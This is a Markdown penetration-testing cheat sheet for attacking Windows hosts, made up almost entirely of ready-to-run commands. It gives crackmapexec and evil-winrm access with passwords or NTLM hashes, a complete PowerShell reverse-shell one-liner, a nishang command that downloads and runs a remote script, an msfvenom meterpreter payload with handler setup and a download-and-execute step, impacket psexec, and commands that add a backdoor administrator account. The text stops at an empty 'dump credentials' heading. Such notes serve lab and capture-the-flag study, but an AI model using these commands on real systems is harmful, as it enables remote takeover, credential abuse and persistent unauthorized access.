# Tools
## crackmapexec
- command execution over winrm
```bash
crackmapexec winrm -u user -p password -x whoami $ip
```

## evil-winrm
- open winrm session with password
```bash
evil-winrm -i $ip -u user -p password
```
- open winrm session with ntlm hash (pass the hash)
```bash
evil-winrm -i $ip -u user -H hash
```

# Reverse shell
- Powershell
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- Reverse shell with nishang Invoke-PowershellTcp
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.6.77.211 -Port 4444
```
## Metasploit
- Upgrade shell to meterpreter session
```sh
# Generate Payload with msfvenom then serve it with SimpleHTTPServer
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o rshell.exe
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your-ip
set LPORT listening-port
run
python3 -m http.server 8000
```

- Download and execute payload on target machine
```powershell
powershell (New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')
```

- Reverse/Privilege Escalation with credentials
```sh
python3 /usr/share/doc/python3-impacket/examples/psexec.py domain/user:password@0.0.0.0 cmd.exe
```

# post exploitation consolidation
## create admin user
```
net user h3xit p@ssw0rd /add
net localgroup administrators h3xit /add
net localgroup "remote management users" h3xit /add
```

# tools
## evil-winrm
### dump credentials